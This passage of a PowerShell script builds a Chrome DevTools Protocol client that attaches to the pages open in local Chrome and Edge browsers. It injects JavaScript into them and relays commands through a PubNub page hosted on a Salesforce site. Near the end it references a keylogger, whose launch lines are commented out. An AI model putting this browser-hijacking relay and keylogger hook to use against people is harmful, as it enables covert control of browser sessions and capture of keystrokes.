    # of client browser if any
}

function Find-PubNubBrowser {
    # should find the browser used to make pubnub connections
}

class PSCDPException : System.Exception {

    PSCDPException([string]$Message) : base($Message) {
    }
}

class PSCDP {

    $debugport = 9223
    $pubnuburl = $null

    $logconsolemsg = $false
    $bufferSize = 4096
    $resetonattach = $false

    $wsUri = $null
    $websocket = $null

    [string]$wsname = $null

    $sendQueue = [System.Collections.Concurrent.BlockingCollection[PSCDPCommand]]::new()

    $commands = [System.Collections.Generic.List[PSCDPCommand]]::new()
    $callbackcmds = [System.Collections.Generic.List[PSCDPCommand]]::new()

    $responses = [System.Collections.Generic.List[hashtable]]::new() # TODO refactor to pscustomobject or hashtable
    $results = [System.Collections.Generic.List[object]]::new() # TODO refactor to PSCDPResult
    $errors = [System.Collections.Generic.List[hashtable]]::new() 

    $broadcasts = [System.Collections.Generic.List[PSCDPCommand]]::new()
    $broadcastresponses = [System.Collections.Generic.List[PSCDPResult]]::new()
    $broadcasterrors = [System.Collections.Generic.List[PSCDPResult]]::new()
    [int32]$broadcastcheck = 0

    $pbpings = [System.Collections.Generic.List[PSCDPCommand]]::new()
    $pbpingresponses = [System.Collections.Generic.List[PSCDPResult]]::new()
    $pbpingerrors = [System.Collections.Generic.List[PSCDPResult]]::new()
    [int32]$pbpingcheck = 0

    $versionchecks = [System.Collections.Generic.List[PSCDPCommand]]::new()
    $versionresponses = [System.Collections.Generic.List[object]]::new()
    $versionerrors = [System.Collections.Generic.List[object]]::new()
    [int32]$versionchecksn = 0

    $pubnubmsgs = [System.Collections.Generic.List[hashtable]]::new()

    $targets = [System.Collections.Generic.List[PSCDPTarget]]::new()

    [PSCDPTarget]$pubnubTarget = $null

    [hashtable]$browserversion = $null
    [object]$pingstate = $null

    [int32]$messageId = 1
    $receiveNew = $true
    $byteArray = $null
    $segment = $true
    $task = $true
    $memoryStream = [System.IO.MemoryStream]::new()
    $totalbytecount = 0
    $result = $null

    [hashtable] IsSystemOk() {
        $syshealth = $this.GetSystemHealth()
        $syshealth['issystemok'] = $true

        foreach ($item in $syshealth.GetEnumerator()) {
            if ( ! $item.Value ) {
                $syshealth['issystemok'] = $false
                return $syshealth
            }
        }

        return $syshealth
    }

    [hashtable] GetSystemHealth() {
        return @{
           IsSocketHealthy = $this.IsSocketHealthy()
           IsConnectionOk = $this.IsConnectionOk()
           IsPBPingOk = $this.IsPBPingOk()
           IsBroadcastOk = $this.IsBroadcastOk()
           IsPBConnectOk = $this.IsPBConnectOk()
        }
    }

    [bool] IsSocketHealthy() {
        if ( ( ! $null -eq $this.webSocket ) -and ( $this.webSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open ) ) {
            return $true
        }

        return $false
    }

    [bool] IsPBPingOk() {
        if ( $this.pbpingcheck -le 2 ) {
            return $true
        }

        return $false
    }

    [bool] IsConnectionOk() {

        if ( [string]::IsNullOrEmpty($this.pubnuburl) ) {
            return $true
        }

        if ( $this.versionchecksn -le 3 ) {
            return $true
        }

        return $false
    }

    [bool] IsBroadcastOk() {
        
        if ( [string]::IsNullOrEmpty($this.pubnuburl) ) {
            return $true    
        }

        if ( $this.broadcastcheck -le 2 ) {
            return $true
        }

        return $false
    }

    [bool] IsPBConnectOk() {

        if ( [string]::IsNullOrEmpty($this.pubnuburl) ) {
            return $true    
        }

        if ( $null -eq $this.pubnubTarget ) {
            return $false
        }

        if ( $null -eq $this.pubnubTarget.addbinding_ts ) {
            return $true
        }

        $e = ($(Get-Date) - $this.pubnubTarget.addbinding_ts).TotalSeconds

        if ( $e -le 100 ) {
            return $true
        }

        if ( ! $this.pubnubTarget.addbinding_ok ) {
            return $false
        } elseif ( [string]::IsNullOrEmpty($this.pubnubTarget.executionContextId) ) {
            return $false
        } elseif ( $this.pubnubTarget.executionContextId -eq -1 ) {
            return $false
        }

        return $true
    }

    PSCDP() {
    }

    PSCDP($debugport) {
        $this.debugport = $debugport
    }

    PSCDP($debugport, $pubnuburl, $wsname) {
        $this.debugport = $debugport
        $this.pubnuburl = $pubnuburl
        $this.wsname = $wsname
    }

    [System.Uri] GetWSUrI() {

        if ( $null -ne $this.wsUri ) {
            return $this.wsUri
        }

        $ttargets = $this.GetTargets() # anchor
        
        $this.targets = $ttargets

        if ( ! [string]::IsNullOrEmpty($this.pubnuburl) ) {
            $targetInfo = ($ttargets | Where-Object { $_.url -eq $this.pubnuburl } | Select-Object -First 1)
            $this.pubnubTarget = $targetInfo
            $twsUri = $targetInfo.webSocketDebuggerUrl
        } else {
            $twsUri = ($ttargets | Select-Object -First 1).webSocketDebuggerUrl
        }

        $twsUri = New-Object System.Uri($twsUri)

        $this.wsUri = $twsUri

        return $this.wsUri
    }

    [System.Collections.Generic.List[PSCDPTarget]] GetTargets() {

        $endpoint = "http://localhost:$($this.debugport)/json/list"

        $ttargets = Invoke-RestMethod -Uri $endpoint -ErrorAction Stop

        $stargets = [System.Collections.Generic.List[PSCDPTarget]]::new()

        $stargets = $ttargets | Where-Object { $_.type -eq "page" } | ForEach-Object {
            $target = @{}
            $_.psobject.Properties | ForEach-Object { 
                $key = $_.Name
                
                if ( $key -eq "id" ) {
                    $key = "targetId"
                }

                $target[$key] = $_.Value 
            }
            
            [PSCDPTarget]$target
        }

        $stargets = [System.Collections.Generic.List[PSCDPTarget]]$stargets
        return $stargets
    }

    [void] ConnectCdp() {
        Log-Msg "new CDP connection at $($this.debugport)"

        $this.wsUri = $this.GetWSUrI()

        if ( $null -eq $this.websocket ) {
            Log-Msg "connecting to cdp on [$($this.wsUri)]"
        } else {
            Log-Msg "reconnecting to cdp on [$($this.wsUri)]"
        }

        $this.websocket = New-Object System.Net.WebSockets.ClientWebSocket

        $connectTask = $this.websocket.ConnectAsync($this.wsUri, [System.Threading.CancellationToken]::None)

        if ( $null -eq $this.websocket) {
            throw "could not connect websocket"
        }

        $connectTask.Wait()
        
        Log-Msg "Connected! Current WebSocketState: $($this.websocket.State)" -ForegroundColor Green

        $params = @{
            autoAttach = $true
            waitForDebuggerOnStart = $false
            flatten = $true
            filter= @(
                @{
                    type="page"
                    exclude=$false
                }
            )
        }
        $this.AddQueue( @{ method="Target.setAutoAttach"; params=$params } ) 
    
        $this.AddQueue( @{ method="Target.setDiscoverTargets"; params=@{ discover=$true} } ) 

        $this.AddQueue( @{ method="Target.getTargets"; params=@{ filter=@( @{ type="page"; exclude=$false } ) } } ) 
    }

    [PSCDPCommand] GetCommandByID([string]$id) {
        $cmd = $this.commands | Where-Object { $_.id -eq $id } | Select-Object -First 1
        return $cmd
    }

    [PSCDPTarget] GetTarget($targetId) {
        $target = $this.targets | Where-Object { $_.targetId -eq $targetId } | Select-Object -First 1

        return $target
    }

    [PSCDPCommand] SendCdpCommand([PSCDPCommand]$cmd) {
        
        if ( $null -eq $cmd ) {
            throw [PSCDPCommandException]::new("cmd is null")
        }

        $id = $this.messageId++

        $cmd.id = $id
        
        $this.commands.Add($cmd)

        if ( $cmd.HasCallback() ) {
            $this.callbackcmds.Add($cmd)
        }

        if( $cmd.ispbping ) {
            $this.pbpings.Add($cmd)
            $this.pbpingcheck += 1
        }
        
        if ( $cmd.isbrowserversion ) {
            $this.versionchecks.Add($cmd)
            $this.versionchecksn += 1
        }

        if ( $cmd.isbroadcast ) {
            $this.broadcasts.Add($cmd)
            $this.broadcastcheck += 1
        }

        $payload = $cmd.ToJson() 
    
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        $buffer = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
        
        $sendTask = $this.websocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
        
        if ( $null -ne $sendTask ) {
            $tresult = $sendTask.GetAwaiter().GetResult()
        } else {
            throw [PSCDPCommandException]::new('fatal error -- task is null')
        }

        $cmd.sendTask = $sendTask
        $cmd.taskresult = $tresult

        return $cmd
    }
    
    [void] InitReceive() {
        if ( ! $this.receiveNew ) {
            return
        }

        $this.byteArray = [byte[]]::new($this.bufferSize)
        $this.segment = [ArraySegment[byte]]::new($this.byteArray)

        $this.task = $this.webSocket.ReceiveAsync($this.segment, [System.Threading.CancellationToken]::None)
        $this.receiveNew = $false
    }

    [void] ReadMessage() {
        if ( ! $this.task.IsCompleted ) {
            return
        }

        $this.result = $this.task.GetAwaiter().GetResult()
        # TODO: throws error -- The remote party closed the WebSocket connection without completing the close handshake.

        $this.receiveNew = $true

        if ($this.result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
            throw "WebSocket connection closed by the remote host."
        }
        elseif ($this.task.IsFaulted) {
            throw "[X2H2] Receive failed: $($this.task.Exception.InnerException.Message)"
        }
        elseif ($this.task.IsCanceled) {
            throw "[A2O9] Receive operation was cancelled."
        }
        elseif ( ! ( $this.task.Status -eq [System.Threading.Tasks.TaskStatus]::RanToCompletion ) ) {
            throw "task Status != RanToCompletion"
        } else {

            $bytesReceived = $this.result.Count
                        
            if ($bytesReceived -gt 0) {
                $this.memoryStream.Write($this.byteArray, 0, $bytesReceived)

                $this.totalbytecount = $this.totalbytecount + $bytesReceived
            }

        }
    }

    [void] EndMessage() {
        if ( ! $this.result.EndOfMessage) {
            return
        }

        $completeBytes = $this.memoryStream.ToArray()

        if ( $completeBytes.count -le 0 ) {
            return
        }

        $json = [System.Text.Encoding]::UTF8.GetString($completeBytes)
        $this.memoryStream = New-Object System.IO.MemoryStream
        $this.totalbytecount = 0

        if ( [string]::IsNullOrWhiteSpace($json) ) {
            return
        }

        try {
            $msg = $json | ConvertFrom-Json # TODO refactor to use PSCDPResult
        } catch {
            Log-Msg $_ # TODO refactor to report exception
            return
        }
        
        $this.ProcessMessage($msg)
    }

    [void] ProcessMessage([PSCustomObject]$msg) {
        $iserror = $false
        $isresult = $false

        $attachedToTarget = $false
        $targetCreated = $false
        $targetDestroyed = $false
        $bindingCalled = $false
        $consoleAPICalled = $false
        $executionContextCreated = $false
        $executionContextDestroyed = $false
        $executionContextsCleared = $false

        $sessionId = $null

        try { $sessionId = $msg.params.sessionId } catch { } # notifications don't have an ID field

        if ( [string]::IsNullOrWhiteSpace($sessionId) ) {
            try { $sessionId = $msg.sessionId } catch { }
        }

        $msght = @{}
        $msg.psobject.Properties | ForEach-Object {

            if ( $_.Name -eq "result" ) {
                $isresult = $true
            } elseif ( $_.Name -eq "method" )  {
                if ( $_.Value -eq 'Target.attachedToTarget' ) {
                    $attachedToTarget = $true
                } elseif ( $_.Value -eq 'Target.targetCreated' ) {
                    $targetCreated = $true
                } elseif ( $_.Value -eq 'Target.targetDestroyed' ) {
                    $targetDestroyed = $true
                } elseif ( $_.Value -eq 'Runtime.bindingCalled' ) {
                    $bindingCalled = $true
                } elseif ( $_.Value -eq 'Runtime.consoleAPICalled' ) {
                    $consoleAPICalled = $true
                } elseif ( $_.Value -eq 'Runtime.executionContextCreated' ) {
                    $executionContextCreated = $true
                } elseif ( $_.Value -eq 'Runtime.executionContextDestroyed' ) {
                    $executionContextDestroyed = $true
                } elseif ( $_.Value -eq 'Runtime.executionContextsCleared' ) {
                    $executionContextsCleared = $true
                }

            } elseif ( $_.Name -eq "error" ) {
                $iserror = $true
            } elseif ( $_.Name -eq "id" ) {
                $isresult = $true
            }

            $msght[$_.Name] = $_.Value
        }

        $this.responses.Add($msght)

        $iserror = $iserror -or $this.IsMessageError($msght)
        if ( $iserror ) {
            $this.errors.Add($msght)
        }

        if ( $isresult ) {
            $cmd = $this.GetCommandByID($msg.id)
            
            if ( $null -ne $cmd ) {
                $cmd.response = [PSCDPResult]::Create($msght)
                $cmd.response.cmd = $cmd
                $cmd.iserror = $iserror
            }

            $msght.Add('cmd', $cmd)
        }

        if ( $bindingCalled ) {
            if ( $msght['params'].name -eq "onPubNubEvent" ) {
                $this.pubnubmsgs.Add($msght)
                $payload = $msght['params'].payload
                Process-PubNubEvent -Message $payload
            } 
        }

        if ( $consoleAPICalled ) {
            $msghtstr = $msght.GetEnumerator() | ForEach-Object { "{0}={1}" -f $_.Key, $_.Value } | Out-String
            
            if ( $this.logconsolemsg ) {
                Log-Msg $msghtstr 
                Log-Msg ($msght['params'].args | Out-String)
            }

        }

        if ( $executionContextCreated ) {
            $origin = $msg.params.context.origin
            $executionContextId = $msg.params.context.id

            $target = $this.targets | Where-Object { $_.sessionId -eq $sessionId } | Select-Object -First 1

            if ( $null -ne $target ) {
                $target.executionContextId = $executionContextId
            }

            if ( $null -ne $this.pubnubTarget ) {
                $initorigin = [System.Uri]$this.pubnuburl
                $initorigin = "$($initorigin.Scheme)://$($initorigin.Host)"

                if ( $origin -eq $initorigin ) {
                    $this.pubnubTarget.executionContextId = $executionContextId
                }
            }
        }

        # not implemented
        if ( $executionContextDestroyed ) {
            $texecutionContextId = $msg.params.executionContextId
            # pass
        }

        # WARN throws exception
        # TODO refactor for pbtarget -- check if target is pubnubtarget
        if ( $executionContextsCleared ) {
            # TODO check if $pubnubtarget.sessionId -eq $sessionid
            # throw "executionContextsCleared -- reset CDP connection"
        }

        if ( $targetCreated ) { # add target to list
            $targetInfo = $msg.params.targetInfo

            if ( $targetInfo.type -eq "page" ) {
                $targetInfo = [PSCDPTarget]::Create($targetInfo)

                $ptarget = $this.targets | Where-Object { $_.targetId -eq $targetInfo.targetId } | Select-Object -First 1

                if ( $null -eq $ptarget ) {
                    $this.targets.Add($targetInfo)
                } else {
                    $targetInfo = $ptarget
                }

                $this.AddQueue( @{ 
                    method="Target.attachToTarget"; 
                    params=@{ targetId=$targetInfo.targetId; flatten=$true }; 
                } )

                if ( ( ! [string]::IsNullOrEmpty($this.pubnuburl) ) -and $targetInfo.url -eq $this.pubnuburl ) {
                    $this.pubnubTarget = $targetInfo
                }
            }
            
        }

        if ( $attachedToTarget ) { # update sessionId
            $targetInfo = $msg.params.targetInfo
            $targetInfo = [PSCDPTarget]::Create($targetInfo)

            $targetInfo.sessionId = $sessionId

            $target = $this.targets | Where-Object { $_.targetId -eq $targetInfo.targetId } | Select-Object -First 1

            if ( $null -eq $target ) {
                $this.targets.Add($targetInfo)
            } else {
                $target.sessionId = $sessionId
            }

            if ( ( ! [string]::IsNullOrEmpty($this.pubnuburl) ) -and $targetInfo.url -eq $this.pubnuburl ) {
                $this.pubnubTarget = $targetInfo # ? should not be necessary
            }

            $this.LoadQueue($targetInfo)
        }

        if ( $targetDestroyed ) {
            $targetInfo = $msg.params.targetInfo

            $index = $this.targets.FindIndex( { $_.targetId -eq $targetInfo.targetId } )

            if ( $index -ge 0 ) {
                $this.targets.RemoveAt($index)
            }
        }

    }

    [bool] IsMessageError([hashtable]$msg) {

        $errorType = [PSCDPResult]::GetErrorType($msg)

        $iserror = $true

        if ( $errorType -eq [PSCDPCommandErrorType]::NoError ) {
            $iserror = $false
        }
    
        return $iserror
    }

    [void] NextCmd() {

        if ( $this.sendQueue.IsCompleted -or ( $this.sendQueue.Count -le 0 ) ) {
            return
        }
        
        $cmd = $this.sendQueue.Take()

        $targetid = $cmd.targetid
        $target = $cmd.target

        if ( $null -eq $target -and ( ! [string]::IsNullOrEmpty($targetid) ) ) {
            $target = $this.GetTarget($targetid)
            $cmd.target = $target
        }

        if ( $null -ne $target -and ( [string]::IsNullOrEmpty($targetid) ) ) {
            $cmd.target = $target
        }

        $cmd = $this.SendCdpCommand($cmd)
    }

    [void] ExecCallbacks() {

        for ( $i = 0; $i -lt $this.callbackcmds.Count; $i++) {
            $cmd = $this.callbackcmds[$i]

            if ( $cmd.HasCallback() -and ( ! $cmd.isinvoked ) -and ( $null -ne $cmd.response) ) {
                $cmd.callback.Invoke($cmd.response,$this)
                $cmd.isinvoked = $true
            }

        }

    }

    [PSCDPCommand] AddQueue([hashtable]$msg) {
        $cmd = [PSCDPCommand]::Create($msg)
        $this.sendQueue.Add($cmd)

        return $cmd
    }

    [void] LoadQueue([PSCDPTarget]$target) {

        # $this.sendQueue.Add( @{ method="Overlay.enable"; params=@{ enabled = $true } } )
        # $this.sendQueue.Add( @{ method="Network.enable"; params=@{ enabled = $true } } )
        
        $this.AddQueue( @{ method="Page.enable"; params=@{ enabled = $true }; target=$target } )
        $this.AddQueue( @{ method="Page.setLifecycleEventsEnabled"; params=@{ enabled = $true }; target=$target } )
        $this.AddQueue( @{ method="DOM.enable"; params=@{ enabled = $true }; target=$target } )
        $this.AddQueue( @{ method="Runtime.enable"; params=@{ enabled = $true }; target=$target; callback=$script:runtime_enable_callback } )

        if ( [string]::IsNullOrWhiteSpace($this.pubnuburl) ) {
            $this.AddQueue( @{ method="Emulation.setFocusEmulationEnabled"; params=@{ enabled = $true }; target=$target; callback=$script:emulation_enable_callback } )
        }
        
        if ( ! [string]::IsNullOrWhiteSpace($this.pubnuburl) -and $target.url -eq $this.pubnuburl -and $target.addbinding_ok -eq $false -and $target.targetId -eq $this.pubnubTarget.targetId) {
            $this.pubnubTarget.addbinding_ts = Get-Date
            $this.AddQueue( @{ method="Runtime.addBinding"; params=@{ name="onPubNubEvent" }; target=$target; callback=$script:runtime_addBinding_callback } )
        }
    }

    [void] SendPBMessage([hashtable]$pbmsg) {

        if ( [string]::IsNullOrEmpty($this.pubnuburl) ) {
            return
        }

        if ( $null -eq $this.pubnubTarget ) {
            return
        }

        if ( [string]::IsNullOrEmpty($this.pubnubTarget.executionContextId) ) {
            return
        }

        $json = $pbmsg | ConvertTo-Json -Depth 10 # TODO wrap in try catch and report error as needed
        $tbytes = [System.Text.Encoding]::UTF8.GetBytes($json)
        $jsonb = "`"" + [System.Convert]::ToBase64String($tbytes) + "`""

        $isbroadcast = $false

        if ( $pbmsg.ContainsKey('builtincmd') -and $pbmsg['builtincmd'] -eq "SendBroadcast" ) {
            $isbroadcast = $true
        }

        $callbackfunc = $script:SendPBMessage_callback

        if ( $isbroadcast ) {
            $callbackfunc = $script:BroadcastMsg_callback
        }

        $params = @{
            functionDeclaration="function f() { let tpayload=JSON.parse(atob($jsonb)); sendMessage(tpayload); }"
            executionContextId=$this.pubnubTarget.executionContextId
            returnByValue=$true
        }

        $cmd = @{ 
            method="Runtime.callFunctionOn"; 
            params=$params; 
            target=$this.pubnubTarget; 
            callback=$callbackfunc; 
            isbroadcast=$isbroadcast
        }

        $cmd = $this.AddQueue( $cmd )

    }

    [void] PingPBTarget() {

        if ( [string]::IsNullOrEmpty($this.pubnuburl) ) {
            return
        }

        if ( $null -eq $this.pubnubTarget ) {
            return
        }

        $params = @{
            expression="(function() { console.log(`"PubNub Status Notification -- Successfully connected from pscdp.relay.ps1 -- "+ $(Get-Timestamp) + " `"); return " + $(Get-Random -Minimum 1 -Maximum 100) + "; })()"
            returnByValue=$true
        }

        $this.AddQueue( @{ 
            method="Runtime.evaluate"; 
            params=$params; 
            target=$this.pubnubTarget; 
            callback=$script:pingpbtarget_callback 
            ispbping=$true
        } )
    }

    [void] GetBrowserVersion() {
        $msg = @{ 
            method="Browser.getVersion"; 
            params=@{}; 
            callback=$script:browserversion_callback;
            isbrowserversion=$true
        }

        $this.AddQueue( $msg )
    }

    [void] Broadcast() {

        $msg = @{
            builtincmd="SendBroadcast"
            source="pscdp.relay.ps1"
            destination="BROADCAST"
            ts=$(Get-Timestamp)
            cmdid=$(Get-Random -Minimum 10000000 -Maximum 100000000)
        }

        $this.SendPBMessage($msg)
    }

    [void] LogState() {
        $msgstrs = @()
        $msgstrs += "[$($this.wsname)]"
        $msgstrs += "[sendQueue: $($this.sendQueue.Count)]"
        $msgstrs += "[responses: $($this.responses.Count)]"
        $msgstrs += "[commands: $($this.commands.Count) results: $($this.results.Count) errors: $($this.errors.Count)]"
       
        if ( $null -ne $this.pubnubTarget) {
            $msgstrs += "[version checks sent: $($this.versionchecks.Count) received: $($this.versionresponses.Count) errors: $($this.versionerrors.Count)]"

            $msgstrs += "[broadcasts sent: $($this.broadcasts.Count) received: $($this.broadcastresponses.Count) errors: $($this.broadcasterrors.Count)]"
       
            $msgstrs += "[pbpings sent: $($this.pbpings.Count) received: $($this.pbpingresponses.Count) errors: $($this.pbpingerrors.Count)]"

            $msgstrs += "[pbmsgs: $($this.pubnubmsgs.Count)]"
            
            $e = ( $this.pubnubTarget.addbinding_ts_ok - $this.pubnubTarget.addbinding_ts ).TotalSeconds
            $msgstrs += "[addbinding_ok: $($this.pubnubTarget.addbinding_ok) ts: $e]"

            $msgstrs += "[executionContextId: $($this.pubnubTarget.executionContextId)]"
        }

        $msgstr = $msgstrs -join " "
        Log-Msg $msgstr
    }

    static [void] Iterate([ref]$tcdpobj, [bool]$broadcast) {
        $cdpobj = $tcdpobj.Value
        $cdpobj.LogState()

        $check = $cdpobj.IsSystemOk()

        if ( ! $check['issystemok'] ) {
            $checkstr = ($check.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join '|'

            Log-Msg "$($cdpobj.wsname) system not ok -- connecting"
            Log-Msg $checkstr
            
            $cdpobj = [PSCDP]::new($cdpobj.debugport, $cdpobj.pubnuburl, $cdpobj.wsname)
            $tcdpobj.Value = $cdpobj
            $cdpobj.ConnectCdp()

            $check = $cdpobj.IsSystemOk()
            
            if ( ! $check['issystemok'] ) {
                throw [PSCDPException]::new('pubnubws system not ok -- skipping to next iteration')
            }

        } else {

            $cdpobj.InitReceive()
            $cdpobj.ReadMessage()
            $cdpobj.EndMessage()

            $cdpobj.ExecCallbacks()
            $cdpobj.NextCmd()

            if ( $broadcast ) {
                $cdpobj.Broadcast()
                $cdpobj.GetBrowserVersion()
                $cdpobj.PingPBTarget()
            }

        }
    }

}

$script:msedge_debugport = 9222
$script:chrome_debugport = 9223

$script:pubnuburl = "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub"
$clientport = $script:chrome_debugport
$pubnubport = $script:msedge_debugport

$script:pubnubws = [PSCDP]::new($pubnubport, $pubnuburl, "pubnubws")
$script:pubnubws.ConnectCdp()

$script:clientws = [PSCDP]::new($clientport, $null, "clientws")
$script:clientws.ConnectCdp()

$keyboardlogger = {
    try {
        [PowerShell.KeyLogger]::Main()
    } finally {
        if ($script:SingleInstanceEvent) {
            $script:SingleInstanceEvent.Dispose()
        }
    }
}

# $ps = [powershell]::Create().AddScript($keyboardlogger)
# $asyncResult = $ps.BeginInvoke()

$d = 250
$n = 50
$i = 0

while ( $true ) {

    Log-Msg "new iteration -- $($i+1)/$n"

    try {
        [PSCDP]::Iterate($script:pubnubws, ( $i -ge $n ))
    } catch {
        Log-Msg $_
    }

    try {
        [PSCDP]::Iterate($script:clientws, ( $i -ge $n ))
    } catch {
        Log-Msg $_
    }

    Start-Sleep -Milliseconds $d
    
    if ( $i -ge $n ) {
        $i = 0
    } else {
        $i++
    }
}

exit

<#
if ( $null -eq $readtask ) {
    $readbuf = [byte[]]::new($bufferSize)
    $readtask = $reader.ReadAsync($readbuf, 0, $bufferSize, [System.Threading.CancellationToken]::None)
}

if ( $null -ne $readtask -and $readtask.IsCompleted ) {
    $bytesRead = $readTask.GetAwaiter().GetResult()
    $message = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
    $hashobj = ConvertFrom-Json -InputObject $message -AsHashtable
    $sendQueue.Add($hashobj)
    $readtask = $null
}
#>